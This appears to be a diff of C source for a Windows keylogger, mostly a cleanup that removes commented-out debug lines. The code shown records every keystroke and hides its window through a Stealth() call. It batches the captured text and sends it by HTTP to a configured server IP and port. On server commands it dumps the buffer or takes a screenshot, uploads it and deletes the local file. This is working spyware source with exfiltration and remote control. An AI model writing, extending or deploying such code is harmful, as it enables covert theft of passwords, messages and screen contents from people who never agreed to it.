@@ -101,14 +101,11 @@ void SendHTTP(const char *msg)
     // 5 for mmmm=
     snprintf(strHttpPost, session_len, pHttpPost, SERVER_IP, PORT,
              strlen(msg) + 5, msg);
-    // 1024, msg);
 
     printf("%s\n", strHttpPost);
-    // printf("true length: %d\n", strlen(strHttpPost));
 
     ServerConnect();
     send(sockfd, strHttpPost, strlen(strHttpPost), 0);
-    // send(sockfd, pHttpPost, strlen(pHttpPost), 0);
 }
 
 int Save(int key_stroke)
@@ -146,11 +143,9 @@ int Save(int key_stroke)
     }
 
 
-    // std::cout << key_stroke << '\n';
 
     if (key_stroke == VK_BACK) {
         strcat(message, "[#B]");
-        // strcat(message, "[###BACKSPACE]");
     } else if (key_stroke == VK_RETURN) {
         strcat(message, "\n");
     } else if (key_stroke == VK_SPACE) {
@@ -159,38 +154,28 @@ int Save(int key_stroke)
         strcat(message, "\t");
     } else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT ||
                key_stroke == VK_RSHIFT) {
-        // strcat(message, "[###SHIFT]");
     } else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL ||
                key_stroke == VK_RCONTROL) {
         strcat(message, "[#C]");
-        // strcat(message, "[###CTRL]");
     } else if (key_stroke == VK_ESCAPE) {
         strcat(message, "[#ES]");
-        // strcat(message, "[###ESCAPE]");
     } else if (key_stroke == VK_END) {
         strcat(message, "[#ED]");
-        // strcat(message, "[###END]");
     } else if (key_stroke == VK_HOME) {
         strcat(message, "[#HM]");
-        // strcat(message, "[###HOME]");
     } else if (key_stroke == VK_LEFT) {
         strcat(message, "[#L]");
-        // strcat(message, "[###LEFT]");
     } else if (key_stroke == VK_UP) {
         strcat(message, "[#U]");
-        // strcat(message, "[###UP]");
     } else if (key_stroke == VK_RIGHT) {
         strcat(message, "[#R]");
-        // strcat(message, "[###RIGHT]");
     } else if (key_stroke == VK_DOWN) {
         strcat(message, "[#D]");
-        // strcat(message, "[###DOWN]");
     } else if (key_stroke == 190 || key_stroke == 110) {
         strcat(message, ".");
     } else if (key_stroke == 189 || key_stroke == 109) {
         strcat(message, "-");
     } else if (key_stroke == 20) {
-        // strcat(message, "[###CAPSLOCK]");
     } else {
         char key;
         // check caps lock
@@ -222,10 +207,7 @@ int Save(int key_stroke)
         strcat(message, buf);
     }
 
-    // if (strlen(message) > BUFFERSIZE - 50) {
-    // printf("len: %d\n", strlen(message));
     if (strlen(message) > 100) {
-        // send(sockfd, message, BUFFERSIZE, 0);
         SendHTTP(message);
         strcpy(message, "");
     }
@@ -277,10 +259,8 @@ int ServerConnect()
 
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
-    // website = gethostbyname("http://localhost:8081");
 
     address.sin_family = AF_INET;
-    // address.sin_addr.s_addr = *((unsigned long *) website->h_addr);
     address.sin_addr.s_addr = inet_addr(SERVER_IP);
     address.sin_port = htons(PORT);
 
@@ -349,6 +329,7 @@ void ServerMessage(void *p)
 
     while ((rVal = recv(sockfd, buf, BUFFERSIZE, 0)) > 0) {
         buf[rVal] = 0x00;
+        printf("Receive message: %s\n\n", buf);
         if (strcmp(buf, "#get") == 0) {
             SendHTTP(message);
             strcpy(message, "");
@@ -357,8 +338,6 @@ void ServerMessage(void *p)
             ScreenShot(filename);
             imgTransfer(filename);
             int status = DeleteFile(filename);
-
-            // do something here
         }
     }
 }
@@ -376,18 +355,13 @@ void imgTransfer(char *filepath)
         SendHTTP(send_buf);
         ret = fread(send_buf, sizeof(char), FILEBLOCKSIZE, ptrFile);
     }
-    // send(sockfd, send_buf, ret, 0);
     SendHTTP(send_buf);
-    // send(sockfd, "#END", FILEBLOCKSIZE, 0);
     SendHTTP("#END");
     fclose(ptrFile);
 }
 
 int main()
 {
-    // open output file in append mode
-    // OUTPUT_FILE.open(".System32Log.txt", std::ios_base::app);
-
     // visibility of window
     Stealth();
 
